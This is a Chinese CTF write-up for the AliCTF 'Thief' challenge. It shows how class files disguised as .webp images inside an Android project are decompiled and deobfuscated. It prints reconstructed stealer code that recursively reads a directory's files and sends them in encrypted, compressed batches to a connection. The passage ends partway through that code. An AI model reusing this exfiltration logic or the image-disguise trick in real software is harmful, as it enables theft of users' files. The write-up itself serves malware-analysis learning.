---
title: Jar反混淆：AliCTF Thief Writeup
pinned: true
description: java class反混淆
tags: [网络安全]
category: 技术
author: 雪纷飞
draft: true
# updated: 2026-10-10
published: 2026-02-04
image: "api"
---

:::file
[点击下载Thief题目][download]
:::

# 初探

解压文件
```bash collapse={10-48, 52-142, 159-193} /[0-9a-f]{12}\.webp/ /[I1l]{3}\.webp/ "L.webp" "lI.webp" "O0o.webp" /Runner2?\.webp/ nocollapse
┌──(neko㉿kali)-[~/CTFWork/thief-writeup]
└─$ unzip attachment_Thief.zip
Archive:  attachment_Thief.zip
  inflating: dump.pcapng
  inflating: unknown.zip

┌──(neko㉿kali)-[~/CTFWork/thief-writeup]
└─$ unzip unknown.zip
Archive:  unknown.zip
  inflating: .gitignore
   creating: app/
  inflating: app/.gitignore
  inflating: app/build.gradle.kts
  inflating: app/proguard-rules.pro
   creating: app/src/
   creating: app/src/androidTest/
   creating: app/src/androidTest/java/
   creating: app/src/androidTest/java/com/
   creating: app/src/androidTest/java/com/unknown/
  inflating: app/src/androidTest/java/com/unknown/ExampleInstrumentedTest.kt
   creating: app/src/main/
  inflating: app/src/main/AndroidManifest.xml
   creating: app/src/main/java/
   creating: app/src/main/java/com/
   creating: app/src/main/java/com/unknown/
  inflating: app/src/main/java/com/unknown/AbstractPatternMachine.java
  inflating: app/src/main/java/com/unknown/ChaosGraphEngine.java
  inflating: app/src/main/java/com/unknown/ComplexDataProcessor.java
  inflating: app/src/main/java/com/unknown/CryptographicEngine.java
  inflating: app/src/main/java/com/unknown/ExpressionTreeEvaluator.java
  inflating: app/src/main/java/com/unknown/GeneticAlgorithmEngine.java
  inflating: app/src/main/java/com/unknown/MainActivity.kt
  inflating: app/src/main/java/com/unknown/NeuralNetworkEngine.java
  inflating: app/src/main/java/com/unknown/ParticlePhysicsSimulator.java
  inflating: app/src/main/java/com/unknown/QuantumStateSimulator.java
  inflating: app/src/main/java/com/unknown/RedBlackTreeCollection.java
   creating: app/src/main/java/com/unknown/ui/
   creating: app/src/main/java/com/unknown/ui/theme/
  inflating: app/src/main/java/com/unknown/ui/theme/Color.kt
  inflating: app/src/main/java/com/unknown/ui/theme/Theme.kt
  inflating: app/src/main/java/com/unknown/ui/theme/Type.kt
   creating: app/src/main/res/
   creating: app/src/main/res/drawable/
  inflating: app/src/main/res/drawable/ic_launcher_background.xml
  inflating: app/src/main/res/drawable/ic_launcher_foreground.xml
   creating: app/src/main/res/mipmap-anydpi/
  inflating: app/src/main/res/mipmap-anydpi/ic_launcher.xml
  inflating: app/src/main/res/mipmap-anydpi/ic_launcher_round.xml
   creating: app/src/main/res/mipmap-hdpi/
  inflating: app/src/main/res/mipmap-hdpi/00cb1aea225e.webp
  inflating: app/src/main/res/mipmap-hdpi/019e822a8b6f.webp
  inflating: app/src/main/res/mipmap-hdpi/02843b1b055c.webp
  inflating: app/src/main/res/mipmap-hdpi/02d3be941630.webp
  inflating: app/src/main/res/mipmap-hdpi/0635cdd3078a.webp
  inflating: app/src/main/res/mipmap-hdpi/063eb50dd818.webp
  inflating: app/src/main/res/mipmap-hdpi/0b672994a3ba.webp
  inflating: app/src/main/res/mipmap-hdpi/0cf45e983329.webp
  inflating: app/src/main/res/mipmap-hdpi/0d2e43317d0e.webp
  inflating: app/src/main/res/mipmap-hdpi/0ddce802a4c0.webp
  inflating: app/src/main/res/mipmap-hdpi/10b20fbb5e08.webp
  inflating: app/src/main/res/mipmap-hdpi/16cbed56acaf.webp
  inflating: app/src/main/res/mipmap-hdpi/180b0aa3a859.webp
  inflating: app/src/main/res/mipmap-hdpi/1d41367ac1e1.webp
  inflating: app/src/main/res/mipmap-hdpi/1f2dd6f75440.webp
  inflating: app/src/main/res/mipmap-hdpi/1f9338075316.webp
  inflating: app/src/main/res/mipmap-hdpi/22546c69a6da.webp
  inflating: app/src/main/res/mipmap-hdpi/254be5375090.webp
  inflating: app/src/main/res/mipmap-hdpi/25a7758ac7c4.webp
  inflating: app/src/main/res/mipmap-hdpi/26fd7c1b920c.webp
  inflating: app/src/main/res/mipmap-hdpi/27085c22815b.webp
  inflating: app/src/main/res/mipmap-hdpi/2711f31ce3e4.webp
  inflating: app/src/main/res/mipmap-hdpi/2c5cff0ab2fd.webp
  inflating: app/src/main/res/mipmap-hdpi/30ac3d51fe42.webp
  inflating: app/src/main/res/mipmap-hdpi/31b1713e68f8.webp
  inflating: app/src/main/res/mipmap-hdpi/32a1ff09eddc.webp
  inflating: app/src/main/res/mipmap-hdpi/3a8ac5437683.webp
  inflating: app/src/main/res/mipmap-hdpi/3e64191dba33.webp
  inflating: app/src/main/res/mipmap-hdpi/3e9ce3d1c81e.webp
  inflating: app/src/main/res/mipmap-hdpi/4bffc82abe92.webp
  inflating: app/src/main/res/mipmap-hdpi/4e298c94db44.webp
  inflating: app/src/main/res/mipmap-hdpi/4f9bea3cf970.webp
  inflating: app/src/main/res/mipmap-hdpi/506fe320d108.webp
  inflating: app/src/main/res/mipmap-hdpi/54fe4e87aed4.webp
  inflating: app/src/main/res/mipmap-hdpi/568b76452108.webp
  inflating: app/src/main/res/mipmap-hdpi/569dafea4556.webp
  inflating: app/src/main/res/mipmap-hdpi/57b63e3a6ee7.webp
  inflating: app/src/main/res/mipmap-hdpi/5f9a61e635b3.webp
  inflating: app/src/main/res/mipmap-hdpi/61c5f3496a7a.webp
  inflating: app/src/main/res/mipmap-hdpi/634679923a00.webp
  inflating: app/src/main/res/mipmap-hdpi/6750dac499ac.webp
  inflating: app/src/main/res/mipmap-hdpi/690cafdd1503.webp
  inflating: app/src/main/res/mipmap-hdpi/6eabf16b9aad.webp
  inflating: app/src/main/res/mipmap-hdpi/731606f69119.webp
  inflating: app/src/main/res/mipmap-hdpi/76d901bded66.webp
  inflating: app/src/main/res/mipmap-hdpi/776df9f03977.webp
  inflating: app/src/main/res/mipmap-hdpi/792ecf13fa09.webp
  inflating: app/src/main/res/mipmap-hdpi/7b0f3a87e680.webp
  inflating: app/src/main/res/mipmap-hdpi/7b900471b8a1.webp
  inflating: app/src/main/res/mipmap-hdpi/7e2cc5d918c0.webp
  inflating: app/src/main/res/mipmap-hdpi/8085f5dae9cc.webp
  inflating: app/src/main/res/mipmap-hdpi/8179b70e3ea0.webp
  inflating: app/src/main/res/mipmap-hdpi/8290e0ebdbf6.webp
  inflating: app/src/main/res/mipmap-hdpi/8637d314ca9d.webp
  inflating: app/src/main/res/mipmap-hdpi/87f9b9637dae.webp
  inflating: app/src/main/res/mipmap-hdpi/8b994ebac90f.webp
  inflating: app/src/main/res/mipmap-hdpi/8f5eeb5383bb.webp
  inflating: app/src/main/res/mipmap-hdpi/920ecca40266.webp
  inflating: app/src/main/res/mipmap-hdpi/95648cff8515.webp
  inflating: app/src/main/res/mipmap-hdpi/97a7a3568ba0.webp
  inflating: app/src/main/res/mipmap-hdpi/98c13a4a9ac6.webp
  inflating: app/src/main/res/mipmap-hdpi/a7ee7b71ff94.webp
  inflating: app/src/main/res/mipmap-hdpi/ab5244b405b9.webp
  inflating: app/src/main/res/mipmap-hdpi/ae2bf26c907e.webp
  inflating: app/src/main/res/mipmap-hdpi/af67882a1494.webp
  inflating: app/src/main/res/mipmap-hdpi/b1ff10a215c0.webp
  inflating: app/src/main/res/mipmap-hdpi/b28f7de80d54.webp
  inflating: app/src/main/res/mipmap-hdpi/b4e207430ba8.webp
  inflating: app/src/main/res/mipmap-hdpi/b798db1730d2.webp
  inflating: app/src/main/res/mipmap-hdpi/bbf4aa87f975.webp
  inflating: app/src/main/res/mipmap-hdpi/bdcbd50880d1.webp
  inflating: app/src/main/res/mipmap-hdpi/bf92ce0d9e87.webp
  inflating: app/src/main/res/mipmap-hdpi/c0423321343a.webp
  inflating: app/src/main/res/mipmap-hdpi/c0cf4bda25be.webp
  inflating: app/src/main/res/mipmap-hdpi/c51a546bcdb0.webp
  inflating: app/src/main/res/mipmap-hdpi/c67596f073c7.webp
  inflating: app/src/main/res/mipmap-hdpi/c6a00ca7e10d.webp
  inflating: app/src/main/res/mipmap-hdpi/ca439d0170ac.webp
  inflating: app/src/main/res/mipmap-hdpi/cf331c87ad6a.webp
  inflating: app/src/main/res/mipmap-hdpi/d1b9cd0ae68d.webp
  inflating: app/src/main/res/mipmap-hdpi/d255a2936633.webp
  inflating: app/src/main/res/mipmap-hdpi/d4f91144b7f0.webp
  inflating: app/src/main/res/mipmap-hdpi/d86795ad8b27.webp
  inflating: app/src/main/res/mipmap-hdpi/db4f6b21adb6.webp
  inflating: app/src/main/res/mipmap-hdpi/de665f68ce95.webp
  inflating: app/src/main/res/mipmap-hdpi/e3002492be41.webp
  inflating: app/src/main/res/mipmap-hdpi/e5f874bedec0.webp
  inflating: app/src/main/res/mipmap-hdpi/e65a9b3a1e7d.webp
  inflating: app/src/main/res/mipmap-hdpi/eb8dbd2ab6d7.webp
  inflating: app/src/main/res/mipmap-hdpi/ec065558aefe.webp
  inflating: app/src/main/res/mipmap-hdpi/ec9da8cc198b.webp
  inflating: app/src/main/res/mipmap-hdpi/ef16147aa5c9.webp
  inflating: app/src/main/res/mipmap-hdpi/f0bc4743d96a.webp
  inflating: app/src/main/res/mipmap-hdpi/f1cdb9aa7b1a.webp
  inflating: app/src/main/res/mipmap-hdpi/f3ab2e5df795.webp
  inflating: app/src/main/res/mipmap-hdpi/f4bf8cc8d2c4.webp
  inflating: app/src/main/res/mipmap-hdpi/f5e568c92eec.webp
  inflating: app/src/main/res/mipmap-hdpi/fd82197cbbc4.webp
  inflating: app/src/main/res/mipmap-hdpi/I1l.webp
  inflating: app/src/main/res/mipmap-hdpi/ic_launcher.webp
  inflating: app/src/main/res/mipmap-hdpi/ic_launcher_round.webp
  inflating: app/src/main/res/mipmap-hdpi/Il1.webp
  inflating: app/src/main/res/mipmap-hdpi/L.webp
  inflating: app/src/main/res/mipmap-hdpi/l1I.webp
  inflating: app/src/main/res/mipmap-hdpi/lI.webp
  inflating: app/src/main/res/mipmap-hdpi/lI1.webp
  inflating: app/src/main/res/mipmap-hdpi/O0o.webp
  inflating: app/src/main/res/mipmap-hdpi/Runner.webp
  inflating: app/src/main/res/mipmap-hdpi/Runner2.webp
   creating: app/src/main/res/mipmap-mdpi/
  inflating: app/src/main/res/mipmap-mdpi/ic_launcher.webp
  inflating: app/src/main/res/mipmap-mdpi/ic_launcher_round.webp
   creating: app/src/main/res/mipmap-xhdpi/
  inflating: app/src/main/res/mipmap-xhdpi/ic_launcher.webp
  inflating: app/src/main/res/mipmap-xhdpi/ic_launcher_round.webp
   creating: app/src/main/res/mipmap-xxhdpi/
  inflating: app/src/main/res/mipmap-xxhdpi/ic_launcher.webp
  inflating: app/src/main/res/mipmap-xxhdpi/ic_launcher_round.webp
   creating: app/src/main/res/mipmap-xxxhdpi/
  inflating: app/src/main/res/mipmap-xxxhdpi/ic_launcher.webp
  inflating: app/src/main/res/mipmap-xxxhdpi/ic_launcher_round.webp
   creating: app/src/main/res/values/
  inflating: app/src/main/res/values/colors.xml
  inflating: app/src/main/res/values/strings.xml
  inflating: app/src/main/res/values/themes.xml
   creating: app/src/main/res/xml/
  inflating: app/src/main/res/xml/backup_rules.xml
  inflating: app/src/main/res/xml/data_extraction_rules.xml
   creating: app/src/test/
   creating: app/src/test/java/
   creating: app/src/test/java/com/
   creating: app/src/test/java/com/unknown/
  inflating: app/src/test/java/com/unknown/ExampleUnitTest.kt
  inflating: build.bat
  inflating: build.gradle.kts
  inflating: gradle.properties
   creating: gradle/
  inflating: gradle/libs.versions.toml
   creating: gradle/wrapper/
  inflating: gradle/wrapper/gradle-wrapper.jar
  inflating: gradle/wrapper/gradle-wrapper.properties
  inflating: gradlew
  inflating: gradlew.bat
  inflating: local.properties
  inflating: settings.gradle.kts

```

我一看这些神奇的webp文件，就觉得它们不怀好意啊！

```bash "compiled Java class data"
┌──(neko㉿kali)-[~/CTFWork/thief-writeup]
└─$ file app/src/main/res/mipmap-hdpi/*.webp
app/src/main/res/mipmap-hdpi/00cb1aea225e.webp:      compiled Java class data, version 52.0 (Java 1.8)
app/src/main/res/mipmap-hdpi/0b672994a3ba.webp:      compiled Java class data, version 52.0 (Java 1.8)
app/src/main/res/mipmap-hdpi/0cf45e983329.webp:      compiled Java class data, version 51.0 (Java 1.7)
app/src/main/res/mipmap-hdpi/0d2e43317d0e.webp:      compiled Java class data, version 52.0 (Java 1.8)
app/src/main/res/mipmap-hdpi/0ddce802a4c0.webp:      compiled Java class data, version 52.0 (Java 1.8)
app/src/main/res/mipmap-hdpi/1d41367ac1e1.webp:      compiled Java class data, version 51.0 (Java 1.7)
app/src/main/res/mipmap-hdpi/1f2dd6f75440.webp:      compiled Java class data, version 52.0 (Java 1.8)
app/src/main/res/mipmap-hdpi/1f9338075316.webp:      compiled Java class data, version 51.0 (Java 1.7)
app/src/main/res/mipmap-hdpi/02d3be941630.webp:      compiled Java class data, version 52.0 (Java 1.8)
app/src/main/res/mipmap-hdpi/2c5cff0ab2fd.webp:      compiled Java class data, version 52.0 (Java 1.8)
app/src/main/res/mipmap-hdpi/3a8ac5437683.webp:      compiled Java class data, version 51.0 (Java 1.7)
app/src/main/res/mipmap-hdpi/3e9ce3d1c81e.webp:      compiled Java class data, version 52.0 (Java 1.8)
app/src/main/res/mipmap-hdpi/3e64191dba33.webp:      compiled Java class data, version 52.0 (Java 1.8)
app/src/main/res/mipmap-hdpi/4bffc82abe92.webp:      compiled Java class data, version 51.0 (Java 1.7)
app/src/main/res/mipmap-hdpi/4e298c94db44.webp:      compiled Java class data, version 52.0 (Java 1.8)
app/src/main/res/mipmap-hdpi/4f9bea3cf970.webp:      compiled Java class data, version 51.0 (Java 1.7)
app/src/main/res/mipmap-hdpi/5f9a61e635b3.webp:      compiled Java class data, version 52.0 (Java 1.8)
app/src/main/res/mipmap-hdpi/6eabf16b9aad.webp:      compiled Java class data, version 51.0 (Java 1.7)
app/src/main/res/mipmap-hdpi/7b0f3a87e680.webp:      compiled Java class data, version 51.0 (Java 1.7)
app/src/main/res/mipmap-hdpi/7b900471b8a1.webp:      compiled Java class data, version 52.0 (Java 1.8)
app/src/main/res/mipmap-hdpi/7e2cc5d918c0.webp:      compiled Java class data, version 52.0 (Java 1.8)
app/src/main/res/mipmap-hdpi/8b994ebac90f.webp:      compiled Java class data, version 52.0 (Java 1.8)
app/src/main/res/mipmap-hdpi/8f5eeb5383bb.webp:      compiled Java class data, version 52.0 (Java 1.8)
app/src/main/res/mipmap-hdpi/10b20fbb5e08.webp:      compiled Java class data, version 52.0 (Java 1.8)
app/src/main/res/mipmap-hdpi/16cbed56acaf.webp:      compiled Java class data, version 51.0 (Java 1.7)
app/src/main/res/mipmap-hdpi/019e822a8b6f.webp:      compiled Java class data, version 52.0 (Java 1.8)
app/src/main/res/mipmap-hdpi/25a7758ac7c4.webp:      compiled Java class data, version 51.0 (Java 1.7)
app/src/main/res/mipmap-hdpi/26fd7c1b920c.webp:      compiled Java class data, version 52.0 (Java 1.8)
app/src/main/res/mipmap-hdpi/30ac3d51fe42.webp:      compiled Java class data, version 52.0 (Java 1.8)
app/src/main/res/mipmap-hdpi/31b1713e68f8.webp:      compiled Java class data, version 51.0 (Java 1.7)
app/src/main/res/mipmap-hdpi/32a1ff09eddc.webp:      compiled Java class data, version 52.0 (Java 1.8)
app/src/main/res/mipmap-hdpi/54fe4e87aed4.webp:      compiled Java class data, version 52.0 (Java 1.8)
app/src/main/res/mipmap-hdpi/57b63e3a6ee7.webp:      compiled Java class data, version 51.0 (Java 1.7)
app/src/main/res/mipmap-hdpi/61c5f3496a7a.webp:      compiled Java class data, version 52.0 (Java 1.8)
app/src/main/res/mipmap-hdpi/063eb50dd818.webp:      compiled Java class data, version 51.0 (Java 1.7)
app/src/main/res/mipmap-hdpi/76d901bded66.webp:      compiled Java class data, version 51.0 (Java 1.7)
app/src/main/res/mipmap-hdpi/87f9b9637dae.webp:      compiled Java class data, version 52.0 (Java 1.8)
app/src/main/res/mipmap-hdpi/97a7a3568ba0.webp:      compiled Java class data, version 51.0 (Java 1.7)
app/src/main/res/mipmap-hdpi/98c13a4a9ac6.webp:      compiled Java class data, version 51.0 (Java 1.7)
app/src/main/res/mipmap-hdpi/180b0aa3a859.webp:      compiled Java class data, version 52.0 (Java 1.8)
app/src/main/res/mipmap-hdpi/254be5375090.webp:      compiled Java class data, version 51.0 (Java 1.7)
app/src/main/res/mipmap-hdpi/506fe320d108.webp:      compiled Java class data, version 52.0 (Java 1.8)
app/src/main/res/mipmap-hdpi/568b76452108.webp:      compiled Java class data, version 51.0 (Java 1.7)
app/src/main/res/mipmap-hdpi/569dafea4556.webp:      compiled Java class data, version 51.0 (Java 1.7)
app/src/main/res/mipmap-hdpi/0635cdd3078a.webp:      compiled Java class data, version 52.0 (Java 1.8)
app/src/main/res/mipmap-hdpi/690cafdd1503.webp:      compiled Java class data, version 51.0 (Java 1.7)
app/src/main/res/mipmap-hdpi/776df9f03977.webp:      compiled Java class data, version 52.0 (Java 1.8)
app/src/main/res/mipmap-hdpi/792ecf13fa09.webp:      compiled Java class data, version 51.0 (Java 1.7)
app/src/main/res/mipmap-hdpi/920ecca40266.webp:      compiled Java class data, version 52.0 (Java 1.8)
app/src/main/res/mipmap-hdpi/2711f31ce3e4.webp:      compiled Java class data, version 52.0 (Java 1.8)
app/src/main/res/mipmap-hdpi/02843b1b055c.webp:      compiled Java class data, version 51.0 (Java 1.7)
app/src/main/res/mipmap-hdpi/6750dac499ac.webp:      compiled Java class data, version 51.0 (Java 1.7)
app/src/main/res/mipmap-hdpi/8085f5dae9cc.webp:      compiled Java class data, version 51.0 (Java 1.7)
app/src/main/res/mipmap-hdpi/8179b70e3ea0.webp:      compiled Java class data, version 51.0 (Java 1.7)
app/src/main/res/mipmap-hdpi/8290e0ebdbf6.webp:      compiled Java class data, version 51.0 (Java 1.7)
app/src/main/res/mipmap-hdpi/8637d314ca9d.webp:      compiled Java class data, version 51.0 (Java 1.7)
app/src/main/res/mipmap-hdpi/22546c69a6da.webp:      compiled Java class data, version 52.0 (Java 1.8)
app/src/main/res/mipmap-hdpi/27085c22815b.webp:      compiled Java class data, version 52.0 (Java 1.8)
app/src/main/res/mipmap-hdpi/95648cff8515.webp:      compiled Java class data, version 51.0 (Java 1.7)
app/src/main/res/mipmap-hdpi/731606f69119.webp:      compiled Java class data, version 51.0 (Java 1.7)
app/src/main/res/mipmap-hdpi/634679923a00.webp:      compiled Java class data, version 51.0 (Java 1.7)
app/src/main/res/mipmap-hdpi/a7ee7b71ff94.webp:      compiled Java class data, version 52.0 (Java 1.8)
app/src/main/res/mipmap-hdpi/ab5244b405b9.webp:      compiled Java class data, version 51.0 (Java 1.7)
app/src/main/res/mipmap-hdpi/ae2bf26c907e.webp:      compiled Java class data, version 52.0 (Java 1.8)
app/src/main/res/mipmap-hdpi/af67882a1494.webp:      compiled Java class data, version 51.0 (Java 1.7)
app/src/main/res/mipmap-hdpi/b1ff10a215c0.webp:      compiled Java class data, version 52.0 (Java 1.8)
app/src/main/res/mipmap-hdpi/b4e207430ba8.webp:      compiled Java class data, version 52.0 (Java 1.8)
app/src/main/res/mipmap-hdpi/b28f7de80d54.webp:      compiled Java class data, version 52.0 (Java 1.8)
app/src/main/res/mipmap-hdpi/b798db1730d2.webp:      compiled Java class data, version 51.0 (Java 1.7)
app/src/main/res/mipmap-hdpi/bbf4aa87f975.webp:      compiled Java class data, version 52.0 (Java 1.8)
app/src/main/res/mipmap-hdpi/bdcbd50880d1.webp:      compiled Java class data, version 51.0 (Java 1.7)
app/src/main/res/mipmap-hdpi/bf92ce0d9e87.webp:      compiled Java class data, version 51.0 (Java 1.7)
app/src/main/res/mipmap-hdpi/c0cf4bda25be.webp:      compiled Java class data, version 51.0 (Java 1.7)
app/src/main/res/mipmap-hdpi/c6a00ca7e10d.webp:      compiled Java class data, version 51.0 (Java 1.7)
app/src/main/res/mipmap-hdpi/c51a546bcdb0.webp:      compiled Java class data, version 52.0 (Java 1.8)
app/src/main/res/mipmap-hdpi/c67596f073c7.webp:      compiled Java class data, version 52.0 (Java 1.8)
app/src/main/res/mipmap-hdpi/c0423321343a.webp:      compiled Java class data, version 51.0 (Java 1.7)
app/src/main/res/mipmap-hdpi/ca439d0170ac.webp:      compiled Java class data, version 52.0 (Java 1.8)
app/src/main/res/mipmap-hdpi/cf331c87ad6a.webp:      compiled Java class data, version 52.0 (Java 1.8)
app/src/main/res/mipmap-hdpi/d1b9cd0ae68d.webp:      compiled Java class data, version 51.0 (Java 1.7)
app/src/main/res/mipmap-hdpi/d4f91144b7f0.webp:      compiled Java class data, version 51.0 (Java 1.7)
app/src/main/res/mipmap-hdpi/d255a2936633.webp:      compiled Java class data, version 51.0 (Java 1.7)
app/src/main/res/mipmap-hdpi/d86795ad8b27.webp:      compiled Java class data, version 52.0 (Java 1.8)
app/src/main/res/mipmap-hdpi/db4f6b21adb6.webp:      compiled Java class data, version 51.0 (Java 1.7)
app/src/main/res/mipmap-hdpi/de665f68ce95.webp:      compiled Java class data, version 51.0 (Java 1.7)
app/src/main/res/mipmap-hdpi/e5f874bedec0.webp:      compiled Java class data, version 52.0 (Java 1.8)
app/src/main/res/mipmap-hdpi/e65a9b3a1e7d.webp:      compiled Java class data, version 52.0 (Java 1.8)
app/src/main/res/mipmap-hdpi/e3002492be41.webp:      compiled Java class data, version 51.0 (Java 1.7)
app/src/main/res/mipmap-hdpi/eb8dbd2ab6d7.webp:      compiled Java class data, version 52.0 (Java 1.8)
app/src/main/res/mipmap-hdpi/ec9da8cc198b.webp:      compiled Java class data, version 52.0 (Java 1.8)
app/src/main/res/mipmap-hdpi/ec065558aefe.webp:      compiled Java class data, version 51.0 (Java 1.7)
app/src/main/res/mipmap-hdpi/ef16147aa5c9.webp:      compiled Java class data, version 52.0 (Java 1.8)
app/src/main/res/mipmap-hdpi/f0bc4743d96a.webp:      compiled Java class data, version 52.0 (Java 1.8)
app/src/main/res/mipmap-hdpi/f1cdb9aa7b1a.webp:      compiled Java class data, version 52.0 (Java 1.8)
app/src/main/res/mipmap-hdpi/f3ab2e5df795.webp:      compiled Java class data, version 51.0 (Java 1.7)
app/src/main/res/mipmap-hdpi/f4bf8cc8d2c4.webp:      compiled Java class data, version 51.0 (Java 1.7)
app/src/main/res/mipmap-hdpi/f5e568c92eec.webp:      compiled Java class data, version 51.0 (Java 1.7)
app/src/main/res/mipmap-hdpi/fd82197cbbc4.webp:      compiled Java class data, version 51.0 (Java 1.7)
app/src/main/res/mipmap-hdpi/I1l.webp:               compiled Java class data, version 52.0 (Java 1.8)
app/src/main/res/mipmap-hdpi/ic_launcher_round.webp: RIFF (little-endian) data, Web/P image, with alpha, 71+1x71+1
app/src/main/res/mipmap-hdpi/ic_launcher.webp:       RIFF (little-endian) data, Web/P image, with alpha, 71+1x71+1
app/src/main/res/mipmap-hdpi/Il1.webp:               compiled Java class data, version 52.0 (Java 1.8)
app/src/main/res/mipmap-hdpi/l1I.webp:               compiled Java class data, version 52.0 (Java 1.8)
app/src/main/res/mipmap-hdpi/lI1.webp:               compiled Java class data, version 52.0 (Java 1.8)
app/src/main/res/mipmap-hdpi/lI.webp:                compiled Java class data, version 52.0 (Java 1.8)
app/src/main/res/mipmap-hdpi/L.webp:                 compiled Java class data, version 52.0 (Java 1.8)
app/src/main/res/mipmap-hdpi/O0o.webp:               compiled Java class data, version 52.0 (Java 1.8)
app/src/main/res/mipmap-hdpi/Runner2.webp:           compiled Java class data, version 51.0 (Java 1.7)
app/src/main/res/mipmap-hdpi/Runner.webp:            compiled Java class data, version 52.0 (Java 1.8)
```

不过我们还是先来分析分析几个`java`源文件吧：
```bash
┌──(neko㉿kali)-[~/CTFWork/thief-writeup/android]
└─$ ls app/src/main/java/com/unknown/
AbstractPatternMachine.java  ComplexDataProcessor.java  ExpressionTreeEvaluator.java  MainActivity.kt           ParticlePhysicsSimulator.java  RedBlackTreeCollection.java
ChaosGraphEngine.java        CryptographicEngine.java   GeneticAlgorithmEngine.java   NeuralNetworkEngine.java  QuantumStateSimulator.java     ui
```
这几个名字就透着一股AI装高深的味道。事实上，这些代码也全部都是废话。此外，`AndroidManifest.xml`也没有什么特别的信息，因此，分析的重点一定是伪装为`webp`的`class`文件。

# 反编译

我们事实上不太好处理散装的`class`文件，对于这个问题，我的解决方案是：

1. 先将`class`文件编译为`dex`文件
2. 再把`dex`转换为`jar`文件

> 毕竟JEB只能分析`dex`，而许多反混淆工具又只能处理`jar`，我们就这样吧。使用Android SDK的`d8.bat`可以完成`jar`/`class` to `dex`的步骤。使用`d2j-dex2jar.bat`可以完成`dex` to `jar`的步骤。

```ps1 title="PowerShell: Convert to dex file"
Get-ChildItem | ForEach-Object { Rename-Item $_ -NewName $_.Name.Replace(".webp", ".class") }
C:\Users\UserName\AppData\Local\Android\Sdk\build-tools\36.0.0\d8.bat --output . *
# Output: classes.dex
```

我们直接把`classes.dex`用JEB加载，得到的结果说实话蛮难看的。更不用提jadx、jd等反编译器了。

![多么难看啊][jeb-ugly]

不过我们可以观察一下难看的原因：

1. 字符串常量被加密（JEB其实已经自动解密了，如果使用jadx，字符串全部都是加密的）
2. 整形常量被异或
3. 大量的控制流混淆（截图未体现）
   
这些都是比较常规的混淆。既然如此，我们可以直接选用[Jar反混淆器][deobf]来进行去混淆。

我使用的参数是：
```java title="Bootstrap.java"
DeobfuscatorOptions.builder()
  .inputJar(Paths.get("Z:\\classes.jar"))
  .transformers(
      ComposedSkidTransformer::new,
      ComposedUnknownObf1Transformer::new,
      ComposedBranchlockTransformer::new,
      AccessRepairTransformer::new
    )
  .continueOnError()
  .classWriterFlags(ClassWriter.COMPUTE_FRAMES)
  .build())
.start();
```
其中`ComposedSkidTransformer`等复合去混淆器包含了上面提到的内容。

去混淆后文件大小从203KB下降到了98KB。

# 逻辑分析

接下来，我们用JEB打开去混淆后的`dex`文件，随后保存出JEB反编译出来的`java`代码，以便进行逻辑分析。

> JEB的功能真的是一言难尽啊……也就在`java`代码反编译上有点建树吧。

使用VSCode打开反编译后得到的项目，进行一些修复，以便能够通过`java`编译。具体的修复要点有如下几个：

1. 将内部类放到应该放的文件里边。
  > 例如，对于类`A.B`，其不应该出现在`A$B.java`，而应该出现在`A.java`
2. 去除为lambda表达式创建的类，因为JEB已经把lambda表达式内联了。
3. 对于一些名字比较糟糕的类，例如`A$$$B`，它在源代码里会被展示为`A...B`，修复一下名称。
4. 暂时先注注释掉`goto`命令，以便通过编译。

经过上边的操作之后，应该已经能够编译了。

```bash
javac -d build $(find decompile -name '*.java')
```

能够通过编译，那么VSCode的代码分析、重命名等工具也能够正常使用，现在，我们可以将一些功能比较明显的成员进行重命名，这样对于 ~~节省之后的AI操作的token、~~ 帮助我们厘清代码逻辑有很不错的作用。

现在我们来进一步去除`goto`，以确保编译后的文件逻辑正确。对于简单的逻辑，人工操作足矣。对于比较大的函数，我们可以直接把单个函数拷贝给对话补全模型。

![使用Gemini 3 Flash还原代码][no-goto]

现在，我们已经可以编译出逻辑正确的代码了。下面是几个比较关键的地方：

```java title="ThiefManager.java"
public static void run() {
  Loader loader = new Loader();
  try {
    Connection conn = new Connection("127.0.0.1");
    // 设置回调函数
    loader.statusCallback = (byte[] content, int index) -> ThiefManager.sendTo(conn, content, index);
    File baseDir = new File(System.getProperty("user.dir")).getParentFile();

    if (baseDir != null && baseDir.exists()) {
      loader.baseDirPath = baseDir.getAbsolutePath();
      loader.recursiveScanSourceFiles(baseDir);
      for (File file : loader.files) {
        try {
          byte[] fileContent = Files.readAllBytes(file.toPath());
          String path = file.getAbsolutePath();

          // 计算相对路径
          String path2;
          if (loader.baseDirPath == null || !path.startsWith(loader.baseDirPath)) {
            path2 = file.getName();
          } else {
            path2 = path.substring(loader.baseDirPath.length() + 1).replace('\\', '/');
          }
          // 更新计数器并添加记录
          loader.currentFileIndex++;
          loader.totalProcessedCount++;
          loader.fileRecords.add(new FileRecord(path2, fileContent));
          // 检查是否达到批次大小（3个文件）
          if (loader.fileRecords.size() >= 3 && loader.statusCallback != null
                  && !loader.fileRecords.isEmpty()) {
            int v1 = (loader.totalProcessedCount - 1) / 3;
            byte[] payload = loader.generatePayload();
            loader.statusCallback.onBatchReady(payload, v1 + 1);

            // 重置当前批次状态
            loader.fileRecords.clear();
            loader.currentFileIndex = 0;
          }
        } catch (Exception e) {
          // 单个文件处理失败，跳过并继续下一个（对应原代码 catch 后跳回 label_8）
          continue;
        }
      }
      // 循环结束，清空文件列表
      loader.files.clear();
    }
    if (!loader.fileRecords.isEmpty() && loader.statusCallback != null) {
      int v = (loader.totalProcessedCount - 1) / 3;
      byte[] arr_b = loader.generatePayload();
      loader.statusCallback.onBatchReady(arr_b, v + 1);

      loader.fileRecords.clear();
      loader.currentFileIndex = 0;
    }
  } catch (Exception e) {
  }
}
```

```java title="Loader.java"
public final byte[] generatePayload() {
  return this.buildEncryptedArchive((this.totalProcessedCount - 1) / 3 + 1);
}

private byte[] buildEncryptedArchive(int index) {
  try {
    // 1. 生成并加密会话密钥
    byte[] sessionKey = new byte[8];
    this.random.nextBytes(sessionKey);
    byte[] encryptedKey = Loader.encryptSessionKey(sessionKey);

    // 2. 压缩文件内容并记录偏移量
    ArrayList<byte[]> compressedContents = new ArrayList<>();
    ArrayList<Integer> offsets = new ArrayList<>();
    int currentOffset = 0;

    for (FileRecord record : this.fileRecords) {
      offsets.add(currentOffset);
      byte[] compressed = LZRRCompressor.compress(record.content);
      compressedContents.add(compressed);
      currentOffset += compressed.length;
    }

    // 3. 构建并加密加密主体 (Body)
    ByteArrayOutputStream dataStream = new ByteArrayOutputStream();
    for (byte[] data : compressedContents) {
      dataStream.write(data);
    }
